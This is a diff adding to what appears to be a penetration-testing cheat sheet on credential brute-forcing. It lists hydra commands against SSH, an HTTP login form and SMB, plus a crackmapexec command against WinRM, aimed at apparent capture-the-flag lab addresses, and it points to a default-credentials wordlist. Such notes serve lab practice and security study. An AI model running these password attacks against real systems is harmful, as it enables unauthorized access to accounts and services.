@@ -22,3 +22,37 @@ SecLists has a nice default credentials wordlists:
 
 {% embed url="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv" %}
 
+## SSH
+
+```shell
+hydra -l username -P rockyou.txt ssh://<IP>
+```
+
+## HTTP
+
+```shell
+hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong"
+```
+
+```
+```
+
+## SMB
+
+```
+hydra -L users.txt -p password smb://10.10.10.169
+```
+
+```
+hydra -l username -P passwords.txt smb://10.10.10.169
+```
+
+```
+hydra -L users.txt -P passwords.txt smb://10.10.10.169
+```
+
+## WinRM
+
+```shell
+crackmapexec winrm 10.10.140.97 -u username -p passwords.txt
+```
